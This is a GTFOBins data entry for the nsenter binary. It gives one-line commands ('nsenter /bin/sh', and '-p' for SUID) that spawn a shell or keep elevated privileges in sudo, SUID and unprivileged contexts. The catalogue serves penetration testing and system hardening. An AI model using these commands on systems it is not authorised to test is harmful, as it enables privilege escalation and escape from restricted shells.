<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/nsenter -->
---
functions:
  shell:
  - code: |-
      nsenter /bin/sh
    comment: |-
      The shell command can be omitted.
    contexts:
      sudo:
      suid:
        code: |-
          nsenter /bin/sh -p
        shell: false
      unprivileged:
...
